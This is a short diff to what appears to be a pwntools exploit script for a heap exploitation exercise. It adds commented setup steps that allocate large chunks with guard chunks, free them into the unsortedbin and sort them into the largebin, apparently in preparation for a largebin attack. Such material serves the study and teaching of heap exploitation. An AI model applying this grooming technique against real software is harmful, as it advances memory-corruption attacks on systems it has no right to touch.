@@ -57,9 +57,28 @@ username = b"A"*8
 io.sendafter(b"username: ", username)
 io.recvuntil(b"> ")
 
-# Request 2 large chunks
+# 1. Request 2 large chunks (A & B).
 chunk_A = malloc(0x3f8)
+
+# 2. Request a guard chunk, to prevent consolidation of chunk A & B.
+#    Size doesn't matter here.
+malloc(0x88)
+
 chunk_B = malloc(0x3f8)
+
+# 3. Request a guard chunk, to prevent consolidation of chunk B with top chunk after
+#    freeing it.
+#    Size doesn't matter here.
+malloc(0x88)
+
+# 4. Free chunk A & B for getting them included into the unsortedbin.
+free(chunk_A)
+free(chunk_B)
+
+# 5. Sort into largebin.
+malloc(0x400)
+
+
 
 # =============================================================================
 
